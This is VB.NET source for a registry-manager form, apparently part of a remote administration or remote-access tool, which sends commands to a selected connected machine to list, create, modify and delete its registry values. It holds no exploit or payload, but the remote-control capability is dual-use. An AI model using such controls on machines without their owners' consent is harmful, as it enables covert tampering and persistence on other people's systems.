Imports System.IO

Public Class Registrymanager

    Public Currentpath As String = Nothing
    Public Currenthive As String = Nothing
    Dim RegHive As String
    '  Dim RegPath As String
    Private Sub Registrymanager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ComboBox1.SelectedIndex = 1
        AddHandler Waiting.RegKeysListingFailed, AddressOf Waiting_RegKeysListingFailed
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        Currentpath = Nothing '?
        RegHive = ComboBox1.SelectedItem.ToString & "\"
        LabelCurrentPath.Text = ComboBox1.SelectedItem.ToString & "\"
        ListViewRegistrykey.Items.Clear()
        ListViewRegistryValue.Items.Clear()
    End Sub

    Private Function GetIsRoot(ByVal path As String) As Boolean
        If String.IsNullOrEmpty(path) Then
            Return True
        Else
            Return False
        End If

    End Function

    Private Sub Waiting_RegKeysListingFailed(ByVal sender As Object, ByVal e As EventArgs)
        Dim ModifyFailedPath As String = Currentpath 
        Dim index As Integer = ModifyFailedPath.LastIndexOf("\"c, Currentpath.Length - 2)
        If index = -1 Then
            Currentpath = Nothing
        Else
            ModifyFailedPath = ModifyFailedPath.Remove(index)
            Currentpath = ModifyFailedPath

        End If

    End Sub

    Public Sub SplitRegistryData(ByVal RegistryData As String)
        ListViewRegistrykey.Items.Clear()
        ListViewRegistryValue.Items.Clear()
        If Not (GetIsRoot(Currentpath)) Then
            ListViewRegistrykey.Items.Add("[..]", 3)
        End If

        Console.WriteLine(RegistryData)

        'Here we get the string containing everything, regVALUES, keys etc
        Dim Data As String = RegistryData
        'Split by ~~~~~ to seperate keys and values
        Dim RegData() As String = Split(Data, "~~~~~")
        'Split regkeys by ||| this part works
        Dim Parts() As String = Split(RegData(0), "|||")
        'Adding them to the lsitview
        For i As Integer = 0 To UBound(Parts) - 1
            Dim item As New ListViewItem(Parts(i), 2)
            ListViewRegistrykey.Items.Add(item)
        Next


        If Not String.IsNullOrWhiteSpace(RegData(1)) Then
            Dim regkeydata() As String = Split(RegData(1), "|||", StringSplitOptions.RemoveEmptyEntries)
            For Each regkey In regkeydata
                Dim subItems() As String = regkey.Split("|||".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)
                For Each subItem In subItems
                    Dim columns() As String = subItem.Split("~~~~".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)
                    For i As Integer = 0 To columns.Length - 1 Step 3
                        With ListViewRegistryValue.Items.Add(columns(i))
                            .SubItems.Add(columns(i + 1))
                            Select Case columns(i + 1).ToString
                                Case "Binary"
                                    .ImageIndex = 1
                                Case "String"
                                    .ImageIndex = 0
                                Case "ExpandString"
                                    .ImageIndex = 0
                                Case "DWord"
                                    .ImageIndex = 1
                                Case "MultiString"
                                    .ImageIndex = 0
                                Case "QWord"
                                    .ImageIndex = 0
                                Case "None"
                                    .ImageIndex = 0
                                Case "Unknown"
                                    .ImageIndex = 0
                            End Select

                            If i + 2 < columns.Length Then
                                .SubItems.Add(columns(i + 2))
                            Else
                                i -= 1
                            End If
                        End With
                    Next
                Next
            Next
        End If

    End Sub

    Private Sub ButtonGo_Click(sender As Object, e As EventArgs) Handles ButtonGo.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Listing registrykeys/registryvalues...")
        Currenthive = ComboBox1.SelectedItem.ToString
        If ListViewRegistrykey.SelectedItems.Count > 0 Then
            Currentpath = LabelCurrentPath.Text.Substring(Currenthive.Length + 1)
            If Not (GetIsRoot(Currentpath)) Then
                Currentpath &= "\"
            End If
        End If

            If Main.ListViewMain.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
            Else
                MsgBox("No Users online.", MsgBoxStyle.Exclamation)
            End If

            'Needed!
            Dim tmp As String = LabelCurrentPath.Text
            Dim index As Integer = tmp.IndexOf("\")
            tmp = tmp.Substring(0, index) + "|||" + tmp.Substring(index + 1)
            Console.WriteLine(tmp)
            Try
                Main.WriteData(tmp)
                Main.WriteCommand(Main.SelectedUserID & "|36")
                Waiting.ShowDialog()
            Catch x As Exception
                MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Registrymanager")
            End Try
    End Sub

    Private Function InstanceCount(ByVal StringToSearch As String, ByVal StringToFind As String) As Integer
        If CBool(Len(StringToFind)) Then
            InstanceCount = UBound(Split(StringToSearch, StringToFind))
        End If
        Return InstanceCount
    End Function
    Private Sub ListViewRegistrykey_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListViewRegistrykey.SelectedIndexChanged
        'All the changes when selecting path and stuff goes here, so i think here we need to handle that error?

        If ListViewRegistrykey.SelectedItems.Count > 0 Then
            If ListViewRegistrykey.SelectedIndices(0) = 0 AndAlso Not CType(GetIsRoot(Currentpath), Boolean) Then
                Dim index As Integer = Currentpath.LastIndexOf("\"c, Currentpath.Length - 2)
                If index = -1 Then
                    LabelCurrentPath.Text = RegHive
                Else
                    LabelCurrentPath.Text = RegHive & Currentpath.Remove(index)
                End If
            Else
                LabelCurrentPath.Text = RegHive & Currentpath & ListViewRegistrykey.SelectedItems(0).Text
            End If
        End If

    End Sub

    Private Sub ListViewRegistrykey_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListViewRegistrykey.MouseDoubleClick
        ButtonGo.PerformClick() 'Is that all ? :)
    End Sub

    Private Sub Registrymanager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        ListViewRegistrykey.Items.Clear()
        ListViewRegistryValue.Items.Clear()
        Currentpath = String.Empty
        LabelCurrentPath.Text = ComboBox1.SelectedItem.ToString & "\"
    End Sub


    Private Sub ContextMenuStripRegistry_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStripRegistry.Opening
        If (ListViewRegistryValue.Items.Count = 0) Or (ListViewRegistryValue.SelectedItems.Count = 0) Then
            DeleteRegistryvalueToolStripMenuItem.Visible = False
            ModifyRegistryvalueToolStripMenuItem.Visible = False
        Else
            DeleteRegistryvalueToolStripMenuItem.Visible = True
            ModifyRegistryvalueToolStripMenuItem.Visible = True
        End If
    End Sub

    Private Sub CreateRegistryvalueToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateRegistryvalueToolStripMenuItem.Click
        RegistrymanagerCreateValue.ShowDialog()
    End Sub

    Private Sub DeleteRegistryvalueToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteRegistryvalueToolStripMenuItem.Click
        If MessageBox.Show("Are you sure you like to delete the" & vbNewLine & "Registryvalue: " & ListViewRegistryValue.SelectedItems(0).Text, "Delete Registryvalue", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) = Windows.Forms.DialogResult.Yes Then
            Settings.AddLog("Pending", Settings.State.Pending, "Deleting Registryvalue: " & ListViewRegistryValue.SelectedItems(0).Text)
            Try
                Main.WriteData(LabelCurrentPath.Text & "|||" & ListViewRegistryValue.SelectedItems(0).Text)
                Main.WriteCommand(Main.SelectedUserID & "|38")
                Using dialog As New Waiting()
                    dialog.ShowDialog()
                End Using
                '   Me.Close()
            Catch x As Exception
                MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Create Registryvalue")
            End Try

        End If
    End Sub

    Private Sub ModifyRegistryvalueToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ModifyRegistryvalueToolStripMenuItem.Click
        RegistrymanagerModifyValue.TextBoxRegistryvaluename.Text = ListViewRegistryValue.SelectedItems(0).Text

        'Buggy, To-Do : Fix empty value crash
        If String.IsNullOrEmpty(ListViewRegistryValue.SelectedItems(0).SubItems(2).Text) Then
            RegistrymanagerModifyValue.TextBoxRegistryvaluedata.Text = ""
        Else
            RegistrymanagerModifyValue.TextBoxRegistryvaluedata.Text = ListViewRegistryValue.SelectedItems(0).SubItems(2).Text
        End If

        RegistrymanagerModifyValue.ShowDialog()
    End Sub
End Class